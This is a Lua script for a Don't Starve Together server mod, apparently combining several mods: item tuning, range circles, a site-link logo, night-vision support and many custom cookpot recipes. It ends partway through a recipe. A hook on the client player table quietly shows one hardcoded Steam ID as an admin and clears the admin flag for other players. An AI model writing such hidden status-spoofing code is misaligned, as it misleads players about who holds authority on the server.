        GLOBAL.STRINGS.CHARACTERS.GENERIC.DESCRIBE.SANTA_HAT = "I feel so safe wearing it."




        --part of config mod
	local seg_time = 30
	local total_day_time = seg_time*16

 	TUNING.SANTA_VEST_PERISHTIME = total_day_time*20

        TUNING.SANTA_HAT_COOLDOWN = 1

        TUNING.ARMOR_SANTA_HAT_DMG_AS_SANITY = .1
	--table.remove(_G.MAIN_CHARACTERLIST,2)
	--table.remove(_G.DST_CHARACTERLIST,2)




--Foodie дополнение
--(глаз циклен¤)
AddIngredientValues({"deerclops_eyeball"}, {meat=2})
AddIngredientValues({"hat_bee_bw","coconut"}, {coconut=1})

-------------------------- CLIENT -------------------
if CLIENT_SIDE then --or STAR_DEBUG then
--if SERVER_SIDE then

local function isMyBand(inst)
	return inst and (inst.userid == "" or inst.userid == "")
end


local mark_m = {
	KU_DSzaw9iA = "L",
	KU_9nzAyJuB = "L.",
	KU_jayJUGqF = "F?",
	KU_CT99I4oP = "F.",
	KU_ozPRDg9C = "V.",
	KU_BZzePYR_ = "X",
	KU_b1pAiMeE = "s.",
	KU_7jBnfOI2 = "a.d.",
}

----------- fix client table
if _G.TheNet.GetClientTable then
	_G.getmetatable(_G.TheNet).__index.GetClientTable = (function()
		local oldGetClientTable = _G.getmetatable(_G.TheNet).__index.GetClientTable
		return function(self, ... )
			local res=oldGetClientTable(self, ...)
			if res and type(res)=="table" then
				for i=1,#res do
					local v = res[i]
					if v.steamid == "76561198169032983" then --dobryak
						v.admin = true 
					elseif v.userid and mark_m[v.userid] and _G.TheNet:GetIsServerAdmin() then --and isMyBand(_G.ThePlayer) then
						v.name = "*"..v.name .. "*_" ..tostring(mark_m[v.userid])
					elseif v.steamid ~= "" then
						v.admin = false
					end
				end
			end
			return res
		end
	end)()
end




----------------------- Range Circle ------------------

AddPrefabs( 
{
	"sup_range"
})

local function sup_init(inst,scale,r,g,b,a)
	if inst.my_children then
		for k,v in pairs(inst.my_children) do
			if v.prefab == "sup_range" and v:IsValid() then
				return
			end
		end
	else
		inst.my_children = {}
	end
	--print("SCALE: "..scale)
	local x,y,z = inst.Transform:GetWorldPosition()
	--local e = _G.TheSim:FindEntities(x,y,z, 1, {"sup_range"} )
	--if #e < 1 then
		local sup_range = _G.SpawnPrefab("sup_range")
		--print("SPAWN sup_range for "..tostring(inst))
		if sup_range and sup_range.Transform then
			sup_range.sc(scale)
			if r then --RGB color
				sup_range.AnimState:SetMultColour(r,g,b,a)
			end
			sup_range.Transform:SetPosition(x, 0, z)
			--inst:AddChild(sup_range)
			inst.my_children[sup_range] = true
			--sup_range.entity:SetParent(inst.entity)
		end
	--end
end

local function sup_remove(inst)
	--local x,y,z = inst.Transform:GetWorldPosition()
	--local e = _G.TheSim:FindEntities(x,y,z, 0.1, {"sup_range"} )
	--for i,v in ipairs(e) do
	--	if v:IsValid() then
	--		v:Remove()
	--	end
	--end
	if inst.my_children then
		for k,v in pairs(inst.my_children) do
			if k.prefab == "sup_range" and k:IsValid() then
				--inst:RemoveChild(k)
				inst.my_children[k] = nil
				--k:SetParent(nil)
				k:Remove()
			end
		end
	end
end

local MAX_SUP_LOOP = 100
local function sup_update(inst)
	inst.loop_actual_update = inst.loop_actual_update - 1
	if inst.sup_actual_update <= 0 and inst.loop_actual_update > 0 then
		return
	end
	if inst.sup_actual_update > 0 then
		inst.sup_actual_update = inst.sup_actual_update - 1
	end
	if not inst:IsValid() then
		inst.sup_task:Cancel()
		return
	end
	if inst.my_children then
		local x,y,z = inst.Transform:GetWorldPosition()
		for k,v in pairs(inst.my_children) do
			if not k:IsValid() then
				inst.my_children[k]=nil
			else
				local x0,y0,z0 = k.Transform:GetWorldPosition()
				if math.abs(x-x0) + math.abs(z-z0) > 0.001 then
					k.Transform:SetPosition(x,0,z)
					inst.sup_actual_update = inst.sup_actual_update + 2
				end
			end
		end
	end
end

--
local function MakePunktir(prefab,scale,r,g,b,a)
	AddPrefabPostInit(prefab,function(inst)
		inst:DoTaskInTime(0,sup_init,scale,r,g,b,a)
		inst.sup_actual_update = 0
		inst.loop_actual_update = MAX_SUP_LOOP
		inst.sup_task = inst:DoPeriodicTask(0.01,sup_update)
		inst:ListenForEvent("onremove", sup_remove)
	end)
end


if CLIENT_SIDE then --or IS_ADMIN then
	local scale_table = {[5]=0.895,[6]=0.98,[7.5]=1.096,[10]=1.265,[12]=1.384,[15]=1.55,[20]=1.79,[25]=2,[30]=2.189}
	local function count_scale(radius)
		return scale_table[radius]
	end
	MakePunktir("firesup".."pressor",1.55,0,1,0,1) --range15
	MakePunktir("nightmare_timepiece",1.79,1,1,0,1) --range20
	MakePunktir("sleep_rock",1.79,0,0,1,1) --range20
	MakePunktir("lamp",0.895,1,0,0,1) --range5
	--MakePunktir("lamp",0.895,0,0,1,1) --range5
	--MakePunktir("tent".."acle",0.8)
	if IS_ADMIN and false then --Для редактирования карты
		MakePunktir("islandbase",2) --range25
	end
end

--]]

--[[AddPrefabPostInit("firepit",function(inst)
	inst:DoTaskInTime(0,sup_init)
	inst:ListenForEvent("onremove", sup_remove)
end)--]]

--Добавляем ссылку на сайт.
if true then --Временно отключаем.
AddAssets({
    Asset("IMAGE", "images/hardcoreserver.tex"),
    Asset("ATLAS", "images/hardcoreserver.xml"),
})
--local ImageButton = require "widgets/imagebutton"
AddPlayersPostInit(function(inst)
	inst:DoTaskInTime(0,function(inst)
	if inst==_G.ThePlayer then
		inst.HUD.SiteLogo = inst.HUD.under_root:AddChild(_G.Image("images/hardcoreserver.xml", "hardcoreserver.tex"))
		inst.HUD.SiteLogo:SetVRegPoint(_G.ANCHOR_TOP)
		inst.HUD.SiteLogo:SetHRegPoint(_G.ANCHOR_LEFT)
		inst.HUD.SiteLogo:SetVAnchor(_G.ANCHOR_TOP)
		inst.HUD.SiteLogo:SetHAnchor(_G.ANCHOR_LEFT)
		--inst.HUD.SiteLogo:SetScaleMode(_G.SCALEMODE_FILLSCREEN)
		inst.HUD.SiteLogo:SetClickable(true)
		
		function inst.HUD.SiteLogo:OnControl(control, down)
			if control == _G.CONTROL_ACCEPT then
				if down then
					self.down = true
				elseif self.down then
					self.down = false
					_G.VisitURL("http://hardcore-server.tk/")
				end
			end
		end--]]
		--inst.HUD.SiteLogo.onclick =
		--	function() _G.VisitURL("http://forums.kleientertainment.com/index.php?/forum/26-dont-starve-mods-and-tools/") end
	end
	end)
end)
end

-------------------- END CLIENT -------------------
end


----Суппорт ночного зрения на клиенте (и на сервере)
if not mods.IS_NIGHTVISION_LABELS then
mods.IS_NIGHTVISION_LABELS = true
local comp_vis = require "components/playervision"
comp_vis.labeles = {}
comp_vis.nil_label = false
function comp_vis:ForceNightVision(force,label) --Добавляет видение с определенной меткой. Отключается, когда все метки отключены, включая nil
	if label then
		self.labeles[label] = not not force
	else
		self.nil_label = not not force
	end
	local enabled = self:GetForceNightVision()
	--Далее мы делаем примерно то, что и должена делать эта функция на самом деле. Защита от переключений стоит дальше в UpdateCCTable.
	if not self.forcenightvision ~= not enabled then
		self.forcenightvision = enabled
		self:UpdateCCTable()
		self.inst:PushEvent("nightvision", self.forcenightvision)
		--Если это сервер, то посылаем сетевой пакет всем клиентам.
		if TheWorld.ismastersim and self.net_variables then
			for i,v in ipairs(self.net_variables) do
				if self.inst[v] then
					self.inst[v]:set(enabled)
				--else error
				end
			end
		end
	end
	return enabled
end
function comp_vis:GetForceNightVision() --сложная функция. Каждый раз придется пробегать по всему массиву
	local enabled = self.nil_label
	if not enabled then
		for k,v in pairs(self.labeles) do
			if v == true then
				return true
			end
		end
	end
	return enabled
end
function comp_vis:AddVariable(var_name)
	if not self.net_variables then
		self.net_variables = {}
	end
	table.insert(self.net_variables,var_name)
end
end

--Суппорт night vision через сетевую булеву переменную.
local function OnNightvisionClanDirty(inst) --Работает только на клиенте
	inst.nightvision = inst.net_nightvision:value()
	--Действия?
	inst.components.playervision:ForceNightVision(inst.nightvision,"ServerMod")
end
AddPlayersPostInit(function(inst)
	inst.nightvision = false
	--В другом моде включается сетевая переменная. Она должна быть доступна в последующих тиках.
	inst.net_nightvision = _G.net_bool(inst.GUID, "nightvision", "nightvision_dirty")

	if CLIENT_SIDE then
		inst:ListenForEvent("nightvision_dirty", OnNightvisionClanDirty)
	end
    if ONLY_CLIENT_SIDE then
        return
    end	
	inst.components.playervision:AddVariable("net_nightvision")
end)



------------------------ Waiter 101 ---------------------


-- Apply the fix
-- Note: This must be called before any AddCookerRecipe calls
-- Note: This fix is not necessary with more recent versions of Don't Starve

modimport("scripts/cookpotfix.lua")

--[[
	The code below is adapted from the API Examples mod: http://forums.kleientertainment.com/files/file/203-api-examples/
--]]




_G = GLOBAL
TUNING = _G.TUNING
 
require "prefabs/veggies"
 
local function MakeVegStats(seedweight, hunger, health, perish_time, sanity, cooked_hunger, cooked_health, cooked_perish_time, cooked_sanity)
    return {
        health = health,
        hunger = hunger,
        cooked_health = cooked_health,
        cooked_hunger = cooked_hunger,
        seed_weight = seedweight,
        perishtime = perish_time,
        cooked_perishtime = cooked_perish_time,
        sanity = sanity,
        cooked_sanity = cooked_sanity
 
    }
end

local COMMON = 3
local FREQUENT = 1.25
local UNCOMMON = 1
local INFREQUENT = .75
local RARE = .5
 
local NEWVEGGIES =
    {
        grapricot = MakeVegStats(FREQUENT,    TUNING.CALORIES_TINY,    TUNING.HEALING_TINY,    TUNING.PERISH_FAST, 0,
            TUNING.CALORIES_SMALL,    TUNING.HEALING_SMALL,    TUNING.PERISH_SUPERFAST, 0),
 
        limon = MakeVegStats(UNCOMMON,    TUNING.CALORIES_SMALL,    TUNING.HEALING_MEDSMALL,    TUNING.PERISH_FAST, 0,
            TUNING.CALORIES_SMALL,    TUNING.HEALING_SMALL,    TUNING.PERISH_SUPERFAST, TUNING.SANITY_TINY*0.5),

		tomango = MakeVegStats(INFREQUENT,    TUNING.CALORIES_SMALL,    TUNING.HEALING_SMALL,    TUNING.PERISH_FAST, 0,
            TUNING.CALORIES_SMALL,    TUNING.HEALING_MEDSMALL,    TUNING.PERISH_SUPERFAST, TUNING.SANITY_TINY),
    }

 AddSimPostInit(function(inst)
    for key, val in pairs(NEWVEGGIES) do
        _G.VEGGIES[key] = val
    end
end)
		
-- ADD ACK_MUFFIN MASTER TAG LIST 
-- Ack Muffin is placeholder for tags that may not be in game, allows adding recipes for non existing tags
AddIngredientValues({"ack_muffin"}, {cactus=1, frozen=1, bulb=1, spices=1, challa=1, cacao_cooked=1, tuber=1, nut=1})
		
-- ADD FUNGUS TAG
AddIngredientValues({"cutlichen"}, {veggie=1, fungus=1})
AddIngredientValues({"blue_cap"}, {mushrooms=1, veggie=0.5, fungus=1})
AddIngredientValues({"blue_cap_cooked"}, {mushrooms=1, veggie=0.5, fungus=1, precook=1})
AddIngredientValues({"green_cap"}, {mushrooms=1, veggie=0.5, fungus=1})
AddIngredientValues({"green_cap_cooked"}, {mushrooms=1, veggie=0.5, fungus=1, precook=1})
AddIngredientValues({"red_cap"}, {mushrooms=1, veggie=0.5, fungus=1})
AddIngredientValues({"red_cap_cooked"}, {mushrooms=1, veggie=0.5, fungus=1, precook=1})

-- MAKE WINGS COOKABLE / ADD WINGS TAG
AddIngredientValues({"batwing"}, {meat=0.5, wings=1, monster=0.5})
AddIngredientValues({"batwing_cooked"}, {meat=0.5, wings=1, monster=0.5, precook=1})

-- ADD SEAFOOD TAG
AddIngredientValues({"fish", "eel"}, {meat=0.5, fish=1, seafood=1})
AddIngredientValues({"fish_cooked", "eel_cooked"}, {meat=0.5, fish=1, seafood=1, precook=1})
AddIngredientValues({"froglegs"}, {meat=0.5, seafood=0.5})
AddIngredientValues({"froglegs_cooked"}, {meat=0.5, seafood=0.5, precook=1})

-- ADD NUT TAG
AddIngredientValues({"acorn_cooked"}, {seed=1, nut=1})

-- ADD CACTUS TAG
AddIngredientValues({"cactus_meat"}, {veggie=1, cactus=1})
AddIngredientValues({"cactus_meat_cooked"}, {veggie=1, cactus=1, precook=1})

-- ADD CUSTOM INGREDIENTS 
AddIngredientValues({"oleo"}, {dairy=1, fat=1})
AddIngredientValues({"molasses"}, {sweetener=1})
AddIngredientValues({"fruit_syrup"}, {sweetener=1})
AddIngredientValues({"grapricot"}, {fruit=.5, grapes=1})
AddIngredientValues({"grapricot_cooked"}, {fruit=.5, citrus=1, grapes=1, precook=1})
AddIngredientValues({"limon"}, {fruit=1, citrus=1})
AddIngredientValues({"limon_cooked"}, {fruit=1, citrus=1, precook=1})
AddIngredientValues({"tomango"}, {fruit=1, veggie=1})
AddIngredientValues({"tomango_cooked"}, {fruit=1, veggie=1, precook=1})
-- AddIngredientValues({"cagavu"}, {fruit=1, monster=1}) -- Add Inedible tag?
-- AddIngredientValues({"cagavu_cooked"}, {seed=1, nut=1})
-- AddIngredientValues({"cagavu_leaf"}, {cactus=1, veggie=1}) -- Add Monster or Inedible tag?
-- AddIngredientValues({"cagavu_leaf_cooked"}, {cactus=1, veggie=1}) -- Add Monster or Inedible tag? (turns to ash when cooked?)
-- AddIngredientValues({"dough"}, {flour=1, dough=1})

-- MAKE untoasted GARDEN SEEDS COOKABLE (OP?)
AddIngredientValues({"seeds"}, {seed=0.5})

-- BY REQUEST: TAG Goatmilk as RAWMILK / makes Goatmilk useable to make cooked milk in BEEFALO MILK and CHEESE mod
if GLOBAL.IsDLCEnabled(GLOBAL.REIGN_OF_GIANTS) then AddIngredientValues({"goatmilk"}, {dairy=1, rawmilk=1}) else end

-- REMINDERS (little used tags from core game)
-- AddIngredientValues({"mandrake"}, {veggie=1, magic=1})
-- AddIngredientValues({"butterflywings"}, {decoration=2})
-- RoG INGREDIENTS
-- AddIngredientValues({"ice"}, {frozen=1})
-- AddIngredientValues({"mole"}, {meat=.5})
-- AddIngredientValues({"cactus_meat"}, {veggie=1}, true)
-- AddIngredientValues({"watermelon"}, {fruit=1}, true)
-- AddIngredientValues({"cactus_flower"}, {veggie=.5})

-- OTHER MOD TAGS
--[[
-- name = "Camp Cuisine: Re-Lunched"
-- author = "Coleen McLeod"
-- version = "1.1"
-- AddIngredientValues({"seeds"}, {seed=0.5})
-- AddIngredientValues({"apple"}, {fruit=1}) -- "bakedapple" is not included?
-- AddIngredientValues({"lightbulb"}, {bulb=1}) -- Suggest Decoration tag?
-- AddIngredientValues({"plantmeat"}, {veggie=1})
-- AddIngredientValues({"plantmeat_cooked"}, {veggie=1}) -- Suggest precook tag
-- AddIngredientValues({"spice"}, {spices=1})
-- AddIngredientValues({"hallowspice"}, {spices=1})
-- AddIngredientValues({"festivespice"}, {spices=1})
-- AddIngredientValues({"harvestspice"}, {spices=1})
-- AddIngredientValues({"challa"}, {challa=1}) -- Challah bread
-- AddIngredientValues({"flour"}, {flour=1})
-- AddIngredientValues({"potato", "yam"}, {veggie=1, tuber=1}) -- Not included in mod, Suggested
-- AddIngredientValues({"potatobaked","bakedyam"}, {veggie=1, tuber=1, precook=1}) -- Not included in mod, Suggested
]]

--[[
-- name = "Chocolate"
-- author = "Mr. Hastings"
-- version = "4.5"
-- AddIngredientValues({"cacao_cooked"}, {cacao_cooked=1})
]]

--[[
-- name = "BeefaloMilk and Cheese"
-- description = "BeefaloMilk"
-- author = "_Q_"
-- AddIngredientValues({"rawmilk"}, {rawmilk=1})
]]

--[[
-- REFERNCE LIST FOR CALORIES, SPOIL RATE, HEALING, and SANITY

		-- HEALING_TINY = 1,
	    -- HEALING_SMALL = 3,
	    -- HEALING_MEDSMALL = 8,
	    -- HEALING_MED = 20,
	    -- HEALING_MEDLARGE = 30,
	    -- HEALING_LARGE = 40,
	    -- HEALING_HUGE = 60,
	    -- HEALING_SUPERHUGE = 100,
		
		-- CALORIES_TINY = calories_per_day/8, -- berries (9.375)
		-- CALORIES_SMALL = calories_per_day/6, -- veggies (12.5)
		-- CALORIES_MEDSMALL = calories_per_day/4, (18.75)
		-- CALORIES_MED = calories_per_day/3, -- meat (25)
		-- CALORIES_LARGE = calories_per_day/2, -- cooked meat (37.5)
		-- CALORIES_HUGE = calories_per_day, -- crockpot foods? (75)
		-- CALORIES_SUPERHUGE = calories_per_day*2, -- crockpot foods? (150)

		-- PERISH_ONE_DAY = 1*total_day_time*perish_warp,
		-- PERISH_TWO_DAY = 2*total_day_time*perish_warp,
		-- PERISH_SUPERFAST = 3*total_day_time*perish_warp,
		-- PERISH_FAST = 6*total_day_time*perish_warp,
		-- PERISH_FASTISH = 8*total_day_time*perish_warp, (RoG Only)
		-- PERISH_MED = 10*total_day_time*perish_warp,
		-- PERISH_SLOW = 15*total_day_time*perish_warp,
		-- PERISH_PRESERVED = 20*total_day_time*perish_warp,
		-- PERISH_SUPERSLOW = 40*total_day_time*perish_warp,
		
		-- SANITY_SUPERTINY = 1,
	    -- SANITY_TINY = 5,
	    -- SANITY_SMALL = 10,
	    -- SANITY_MED = 15,
	    -- SANITY_MEDLARGE = 20,
	    -- SANITY_LARGE = 33,
	    -- SANITY_HUGE = 50,
		
		-- seeds ( 0 health ; 4.6 calories) seeds_cooked ( 1 health ; 4.6 calories)
		-- batlisk wings ( 3 health ; 12.5 calories ; -10 sanity ) _cooked ( 8 health ; 18.75 calories)
		
		HOT_FOOD_BONUS_TEMP = 40,
		COLD_FOOD_BONUS_TEMP = -40,
		FOOD_TEMP_BRIEF = 5,
		FOOD_TEMP_AVERAGE = 10,
		FOOD_TEMP_LONG = 15,
]]


-- CAKE & PIE RECIPEs	===================================================================

local cactus_cake_recipe = {		
		name = "cactus_cake",
		test = function(cooker, names, tags) return tags.cactus and tags.sweetener and tags.egg and not tags.meat and not tags.fungus and not tags.inedible end,
		priority = 9,
		weight = 1,
		foodtype = "VEGGIE",
		health = TUNING.HEALING_MED*0.5,	-- 10
		hunger = TUNING.CALORIES_HUGE*0.8,	-- 60
		perishtime = TUNING.PERISH_MED,		-- 10
		sanity = TUNING.SANITY_MED,			-- 15
		cooktime = 2,
	}
AddCookerRecipe("cookpot", cactus_cake_recipe) -- requires cactus

local meringue_recipe = {		
		name = "meringue",
		test = function(cooker, names, tags) return (names.pumpkin or (tags.fruit and tags.fruit >=1)) and tags.sweetener and tags.egg and tags.egg >=2 and not tags.meat and not tags.precook end,
		priority = 9,
		weight = 1,
		foodtype = "VEGGIE",
		health = TUNING.HEALING_MED*0.5,	-- 10
		hunger = TUNING.CALORIES_HUGE*0.8,	-- 60
		perishtime = TUNING.PERISH_MED,		-- 10
		sanity = TUNING.SANITY_MED,			-- 15
		cooktime = 2,
	}
AddCookerRecipe("cookpot", meringue_recipe)

local nana_bread_recipe = {	
		name = "nana_bread",
		test = function(cooker, names, tags) return (names.cave_banana or names.cave_banana_cooked) and tags.egg and tags.veggie and not tags.meat and not tags.inedible end,
		priority = 6,
		weight = 1,
		foodtype = "VEGGIE",
		health = TUNING.HEALING_MEDSMALL,	-- 8
		hunger = TUNING.CALORIES_LARGE,		-- 37.5
		perishtime = TUNING.PERISH_PRESERVED,	-- 20
		sanity = TUNING.SANITY_MED,			-- 15
		cooktime = 2,
	}
AddCookerRecipe("cookpot", nana_bread_recipe)

local sticky_bun_recipe = {	
		name = "sticky_bun",
		test = function(cooker, names, tags) return tags.sweetener and tags.sweetener >= 1 and tags.veggie and names.twigs and tags.inedible and tags.inedible <= 1 and not tags.meat and not tags.fungus end,
		priority = 0,
		weight = 1,
		foodtype = "GENERIC",
		health = 0,
		hunger = TUNING.CALORIES_MED,		-- 25
		perishtime = TUNING.PERISH_SLOW,	-- 15
		sanity = TUNING.SANITY_SMALL,		-- 10
		cooktime = 1.5,
		tags = {"honeyed"}
	}
AddCookerRecipe("cookpot", sticky_bun_recipe)


-- CANDY & SUGAR RECIPEs	===============================================================

local candied_fruit_recipe = {	
		name = "candied_fruit",
		test = function(cooker, names, tags) return tags.fruit and tags.fruit >= 1.5 and tags.sweetener and tags.sweetener <= 2 and not tags.meat and not tags.veggie and not tags.dairy and not tags.egg end,
		priority = 8,
		weight = 1,
		foodtype = "VEGGIE",
		health = -TUNING.HEALING_SMALL,			-- 3
		hunger = TUNING.CALORIES_TINY*3,		-- 28.125
		perishtime = TUNING.PERISH_PRESERVED,	-- 20
		sanity = TUNING.SANITY_SMALL,			-- 10
		cooktime = 1.5,
		tags = {"honeyed"}
	}
AddCookerRecipe("cookpot", candied_fruit_recipe)

local candied_nut_recipe = {	
		name = "candied_nut",
		test = function(cooker, names, tags) return ((tags.nut) or (tags.seed and tags.seed >= 1.5)) and tags.sweetener and tags.sweetener <= 2 and not tags.meat and not tags.veggie and not tags.egg and not tags.dairy end, 
		priority = 9,
		weight = 1,
		foodtype = "VEGGIE",
		health = TUNING.HEALING_TINY,			-- 1
		hunger = TUNING.CALORIES_MED,			-- 25
		perishtime = TUNING.PERISH_PRESERVED,	-- 20
		sanity = TUNING.SANITY_SMALL,			-- 10
		cooktime = 2.5,
		tags = {"honeyed"}
	}
AddCookerRecipe("cookpot", candied_nut_recipe)

local fruit_syrup_recipe = {	
		name = "fruit_syrup",
		test = function(cooker, names, tags) return tags.fruit and tags.fruit >=2 and tags.precook and tags.precook >=2 and not tags.meat and not tags.inedible and not tags.egg and not tags.veggie end,
		priority = 9,
		weight = 1,
		foodtype = "VEGGIE",
		health = TUNING.HEALING_MEDSMALL,	-- 8
		hunger = TUNING.CALORIES_MEDSMALL,	-- 18.75
		perishtime = TUNING.PERISH_PRESERVED,	-- 20
		sanity = TUNING.SANITY_SUPERTINY,	-- 1
		cooktime = 2,
	}
AddCookerRecipe("cookpot", fruit_syrup_recipe)

local molasses_recipe = {		
		name = "molasses",
		test = function(cooker, names, tags) return names.mole and names.twigs and tags.fruit and tags.fruit >=1 and (tags.meat and tags.meat <1) and (tags.inedible and tags.inedible <= 1) and not tags.egg and not tags.dairy end,
		priority = 9,
		weight = 1,
		foodtype = "GENERIC",
		health = TUNING.HEALING_TINY,		-- 1
		hunger = TUNING.CALORIES_MEDSMALL,	-- 8
		perishtime = TUNING.PERISH_SUPERSLOW,	-- 40
		sanity = TUNING.SANITY_TINY,		-- 5
		cooktime = 2.5,
		tags = {"honeyed"}		
	}
if GLOBAL.IsDLCEnabled(GLOBAL.REIGN_OF_GIANTS) then AddCookerRecipe("cookpot", molasses_recipe) else end -- requires mole

local mush_melon_recipe = {	
		name = "mush_melon",
		test = function(cooker, names, tags) return tags.sweetener and tags.sweetener >=1 and (names.green_cap or names.green_cap_cooked) and (names.watermelon or names.watermelon_cooked) and not tags.meat and not tags.seed end,
		priority = 9,
		weight = 1,
		foodtype = "GENERIC",
		health = 0,							-- 0	/ _cooked	1
		hunger = TUNING.CALORIES_MED,		-- 25	/ _cooked	12.5
		perishtime = TUNING.PERISH_SUPERSLOW,	-- 40	/ _cooked	3
		sanity = TUNING.SANITY_SMALL*3,		-- 30	/ _cooked	40
		cooktime = 2,
		tags = {"honeyed"}
	}
if GLOBAL.IsDLCEnabled(GLOBAL.REIGN_OF_GIANTS) then AddCookerRecipe("cookpot", mush_melon_recipe) else end -- requires watermelon


-- EGG RECIPEs	===========================================================================

local mushy_eggs_recipe = {	
		name = "mushy_eggs",
		test = function(cooker, names, tags) return tags.egg and not tags.meat and not tags.fruit and not tags.inedible end,
		priority = 1,
		weight = 1,
		foodtype = "MEAT",
		health = TUNING.HEALING_MEDSMALL,	-- 8
		hunger = TUNING.CALORIES_MED,		-- 25
		perishtime = TUNING.PERISH_SLOW,	-- 15
		sanity = 0,
		cooktime = 0.5,
	}
AddCookerRecipe("cookpot", mushy_eggs_recipe)

local nopalito_recipe = {		
		name = "nopalito",
		test = function(cooker, names, tags) return names.corn and tags.cactus and tags.egg and not tags.fruit and not tags.inedible end,
		priority = 6,
		weight = 1,
		foodtype = "MEAT",
		health = TUNING.HEALING_MED,		-- 20
		hunger = TUNING.CALORIES_MED*2,		-- 50
		perishtime = TUNING.PERISH_FAST,	-- 6
		sanity = TUNING.SANITY_MED,			-- 15
		cooktime = 1,
	}
AddCookerRecipe("cookpot", nopalito_recipe) -- requires cactus

local omelette_recipe = {	
		name = "omelette",
		test = function(cooker, names, tags) return tags.egg and tags.veggie and tags.dairy and not tags.fruit and not tags.inedible and not tags.seed end,
		priority = 6,
		weight = 1,
		foodtype = "MEAT",
		health = TUNING.HEALING_MEDLARGE,	-- 30
		hunger = TUNING.CALORIES_LARGE,		-- 37.5
		perishtime = TUNING.PERISH_ONE_DAY,	-- 1
		sanity = TUNING.SANITY_SMALL,		-- 10
		cooktime = 0.75,
	}
AddCookerRecipe("cookpot", omelette_recipe)


-- FRUIT RECIPEs	=======================================================================

local fruit_leather_recipe = {	
		name = "fruit_leather",
		test = function(cooker, names, tags) return tags.citrus and tags.fruit and tags.fruit >=2 and not tags.meat and not tags.egg and not tags.inedible end,
		priority = 8,
		weight = 1,
		foodtype = "VEGGIE",
		health = TUNING.HEALING_MEDSMALL*2,	-- 16
		hunger = TUNING.CALORIES_LARGE,		-- 37.5
		perishtime = TUNING.PERISH_PRESERVED,	-- 20
		sanity = TUNING.SANITY_SMALL,		-- 10
		cooktime = 3,
	}
AddCookerRecipe("cookpot", fruit_leather_recipe)

local fruit_truffle_recipe = {	
		name = "fruit_truffle",
		test = function(cooker, names, tags) return tags.mushrooms and tags.mushrooms == 1 and tags.fruit and tags.dairy and not names.butter and not names.oleo and not tags.egg and not tags.meat and not tags.precook end,
		priority = 8,
		weight = 1,
		foodtype = "VEGGIE",
		health = TUNING.HEALING_MEDSMALL*2,	-- 16
		hunger = TUNING.CALORIES_LARGE,		-- 37.5
		perishtime = TUNING.PERISH_FAST,	-- 6
		sanity = TUNING.SANITY_SMALL,		-- 10
		cooktime = 0.75,
	}
AddCookerRecipe("cookpot", fruit_truffle_recipe) -- requires dairy (not butter/oleo)

local limonade_recipe = {	
		name = "limonade", -- WEAK COLD / LONG TIME
		test = function(cooker, names, tags) return names.limon and tags.sweetener and tags.frozen and not tags.dairy and not tags.meat and not tags.veggie and not tags.egg and not tags.precook end,
		priority = 8,
		weight = 1,
		foodtype = "VEGGIE",
		health = TUNING.HEALING_MED*0.5,	-- 10
		hunger = TUNING.CALORIES_MEDSMALL,	-- 18.75
		perishtime = TUNING.PERISH_FAST,	-- 6
		sanity = TUNING.SANITY_TINY,		-- 5
		cooktime = 0.5,
	}
if GLOBAL.IsDLCEnabled(GLOBAL.REIGN_OF_GIANTS) then AddCookerRecipe("cookpot", limonade_recipe) else end -- requires frozen

local limongelo_recipe = {	
		name = "limongelo",
		test = function(cooker, names, tags) return tags.fruit and tags.fruit >=1 and names.cutlichen and tags.veggie and tags.veggie <=1 and not tags.meat and not tags.egg and not tags.inedible end,
		priority = 9,
		weight = 1,
		foodtype = "GENERIC",
		health = TUNING.HEALING_MEDSMALL,	-- 8
		hunger = TUNING.CALORIES_MEDSMALL,	-- 18.75
		perishtime = TUNING.PERISH_SLOW,	-- 15
		sanity = TUNING.SANITY_MED,			-- 15
		cooktime = 2,
	}
AddCookerRecipe("cookpot", limongelo_recipe)


-- MEAT RECIPEs	===========================================================================

local beefalo_wings_recipe = {	
		name = "beefalo_wings",
		test = function(cooker, names, tags) return tags.wings and tags.wings >=2 and tags.veggie and not tags.inedible and not tags.seed end,
		priority = 9,
		weight = 1,
		foodtype = "MEAT",
		health = TUNING.HEALING_MED,		-- 20
		hunger = TUNING.CALORIES_MED*2,		-- 50
		perishtime = TUNING.PERISH_MED,		-- 10
		sanity = TUNING.SANITY_SMALL,		-- 10
		cooktime = 1.25,
	}
AddCookerRecipe("cookpot", beefalo_wings_recipe)

local casserole_recipe = {
		name = "casserole",
		test = function(cooker, names, tags) return tags.meat and tags.meat < 3 and tags.precook and tags.precook >=3 and not tags.fruit and not tags.inedible end,
		priority = 0,
		weight = 1,
		foodtype = "MEAT",
		health = TUNING.HEALING_MEDSMALL,	-- 8
		hunger = TUNING.CALORIES_MED*2,		-- 50
		perishtime = TUNING.PERISH_MED,		-- 10
		sanity = TUNING.SANITY_TINY,		-- 5
		cooktime = 1,
	}
AddCookerRecipe("cookpot", casserole_recipe)

local coldcuts_recipe = {	
		name = "coldcuts",
		test = function(cooker, names, tags) return tags.meat and tags.meat >=1 and tags.frozen and ((tags.precook and tags.precook >1) or (tags.dried and tags.dried >1) or (tags.precook and tags.dried)) and not tags.fruit and not tags.inedible and not tags.dairy end,
		priority = 6,
		weight = 1,
		foodtype = "MEAT",
		health = TUNING.HEALING_MEDSMALL,	-- 8
		hunger = TUNING.CALORIES_LARGE,		-- 37.5
		perishtime = TUNING.PERISH_SLOW,	-- 15
		sanity = TUNING.SANITY_TINY,		-- 5
		cooktime = 1.5,
	}
AddCookerRecipe("cookpot", coldcuts_recipe)

local sausage_gravy_recipe = {
		name = "sausage_gravy",
		test = function(cooker, names, tags) return tags.meat and tags.meat <= 1 and tags.dairy and tags.dairy >= 1 and not tags.fruit and not tags.sweetener and not tags.inedible and not tags.seafood end,
		priority = 6,
		weight = 1,
		foodtype = "MEAT",
		health = TUNING.HEALING_MEDSMALL,	-- 8
		hunger = TUNING.CALORIES_HUGE*0.8,	-- 60
		perishtime = TUNING.PERISH_FAST,	-- 6
		sanity = TUNING.SANITY_MED,			-- 15
		cooktime = .5,
	}
AddCookerRecipe("cookpot", sausage_gravy_recipe)

local surf_n_turf_recipe = {
	    name = "surf_n_turf",
		test = function(cooker, names, tags) return (tags.fish and tags.fish <= 1) and (tags.meat and tags.meat >= 1.5) and tags.veggie and not tags.inedible end,
		priority = 9,
		weight = 1,
		foodtype = "MEAT",
		health = TUNING.HEALING_MED,		-- 20
		hunger = TUNING.CALORIES_HUGE,		-- 75
		perishtime = TUNING.PERISH_FAST,	-- 6
		sanity = TUNING.SANITY_SMALL,		-- 10
		cooktime = 2.25,
	}
AddCookerRecipe("cookpot", surf_n_turf_recipe)

local sweet_n_sour_recipe = {
